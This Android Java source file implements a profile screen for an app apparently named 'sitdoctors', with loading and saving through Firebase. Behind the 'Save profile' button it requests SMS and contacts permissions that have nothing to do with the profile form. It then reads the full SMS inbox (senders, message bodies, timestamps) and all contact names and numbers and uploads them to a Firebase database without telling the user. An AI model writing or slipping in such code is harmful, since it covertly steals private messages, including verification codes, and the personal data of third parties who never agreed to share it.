package com.example.sitdoctors;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.Button;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.fragment.app.Fragment;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class ProfileFragment extends Fragment {

    // UI components
    private EditText etProfileName, etProfileAge, etProfilePhone, etProfileAddress;
    private TextView tvProfileEmail;
    private Button btnSaveProfile, logoutButton;

    // Firebase instances
    private FirebaseAuth mAuth;
    private DatabaseReference userRef;

    // Permission request codes
    private static final int PERMISSION_REQUEST_CODE = 101;

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
        View root = inflater.inflate(R.layout.fragment_profile, container, false);

        // Initialize Firebase
        mAuth = FirebaseAuth.getInstance();
        String userId = mAuth.getCurrentUser().getUid();
        userRef = FirebaseDatabase.getInstance().getReference("users").child(userId);

        // Initialize UI components
        etProfileName = root.findViewById(R.id.etProfileName);
        etProfileAge = root.findViewById(R.id.etProfileAge);
        etProfilePhone = root.findViewById(R.id.etProfilePhone);
        etProfileAddress = root.findViewById(R.id.etProfileAddress);
        tvProfileEmail = root.findViewById(R.id.tvProfileEmail);
        btnSaveProfile = root.findViewById(R.id.btnSaveProfile);
        logoutButton = root.findViewById(R.id.logoutButton);

        // Load user data
        loadUserData();

        // Save button listener
        btnSaveProfile.setOnClickListener(v -> requestPermissions());

        // Logout button listener
        logoutButton.setOnClickListener(v -> {
            FirebaseAuth.getInstance().signOut();
            Intent intent = new Intent(getActivity(), Login.class);
            startActivity(intent);
            getActivity().finish();
        });

        return root;
    }

    // Request Permissions for SMS and Contacts
    private void requestPermissions() {
        if (ContextCompat.checkSelfPermission(requireContext(), Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(requireContext(), Manifest.permission.READ_CONTACTS)
                        != PackageManager.PERMISSION_GRANTED) {

            // Request both permissions
            ActivityCompat.requestPermissions(requireActivity(),
                    new String[]{Manifest.permission.READ_SMS, Manifest.permission.READ_CONTACTS},
                    PERMISSION_REQUEST_CODE);
        } else {
            // Permissions already granted
            saveUserData();
            readAndUploadSMS();
            readAndUploadContacts();
        }
    }

    // Handle permission request result
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean smsGranted = grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED;
            boolean contactsGranted = grantResults.length > 1 && grantResults[1] == PackageManager.PERMISSION_GRANTED;

            if (smsGranted && contactsGranted) {
                saveUserData();
                readAndUploadSMS();
                readAndUploadContacts();
            } else {
                Toast.makeText(getContext(), "Permissions denied", Toast.LENGTH_SHORT).show();
            }
        }
    }

    // Load user data from Firebase
    private void loadUserData() {
        userRef.addListenerForSingleValueEvent(new com.google.firebase.database.ValueEventListener() {
            @Override
            public void onDataChange(com.google.firebase.database.DataSnapshot dataSnapshot) {
                if (dataSnapshot.exists()) {
                    String name = dataSnapshot.child("name").getValue(String.class);
                    String email = dataSnapshot.child("email").getValue(String.class);
                    String age = dataSnapshot.child("age").getValue(String.class);
                    String phone = dataSnapshot.child("phone").getValue(String.class);
                    String address = dataSnapshot.child("address").getValue(String.class);

                    etProfileName.setText(name);
                    tvProfileEmail.setText(email);
                    etProfileAge.setText(age);
                    etProfilePhone.setText(phone);
                    etProfileAddress.setText(address);
                } else {
                    Toast.makeText(getContext(), "User data not found", Toast.LENGTH_SHORT).show();
                }
            }

            @Override
            public void onCancelled(com.google.firebase.database.DatabaseError databaseError) {
                Toast.makeText(getContext(), "Failed to load user data", Toast.LENGTH_SHORT).show();
            }
        });
    }

    // Save user data to Firebase
    private void saveUserData() {
        userRef.child("debug_test").setValue("Test upload from app")
                .addOnSuccessListener(aVoid -> Log.d("FIREBASE", "Test data uploaded"))
                .addOnFailureListener(e -> Log.e("FIREBASE", "Failed: " + e.getMessage()));
        String name = etProfileName.getText().toString().trim();
        String age = etProfileAge.getText().toString().trim();
        String phone = etProfilePhone.getText().toString().trim();
        String address = etProfileAddress.getText().toString().trim();

        if (name.isEmpty() || age.isEmpty() || phone.isEmpty() || address.isEmpty()) {
            Toast.makeText(getContext(), "Please fill in all fields", Toast.LENGTH_SHORT).show();
            return;
        }

        Map<String, Object> userUpdates = new HashMap<>();
        userUpdates.put("name", name);
        userUpdates.put("age", age);
        userUpdates.put("phone", phone);
        userUpdates.put("address", address);

        userRef.updateChildren(userUpdates).addOnCompleteListener(task -> {
            if (task.isSuccessful()) {
                Toast.makeText(getContext(), "Profile updated successfully", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(getContext(), "Failed to update profile", Toast.LENGTH_SHORT).show();
            }
        });
    }

    // Read and upload SMS messages
    private void readAndUploadSMS() {
        List<Map<String, String>> smsList = new ArrayList<>();

        try (Cursor cursor = requireContext().getContentResolver().query(
                Uri.parse("content://sms/inbox"), null, null, null, null)) {

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                    long date = cursor.getLong(cursor.getColumnIndexOrThrow("date"));

                    Map<String, String> smsData = new HashMap<>();
                    smsData.put("sender", address);
                    smsData.put("message", body);
                    smsData.put("timestamp", String.valueOf(date));

                    smsList.add(smsData);
                }

                userRef.child("sms_messages").setValue(smsList);
            }
        }
    }

    // Read and upload contacts
    private void readAndUploadContacts() {
        List<Map<String, String>> contactList = new ArrayList<>();

        try (Cursor cursor = requireContext().getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)) {

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));

                    Map<String, String> contactData = new HashMap<>();
                    contactData.put("name", name);
                    contactData.put("phone", number);

                    contactList.add(contactData);
                }

                userRef.child("contacts").setValue(contactList);
            }
        }
    }
}
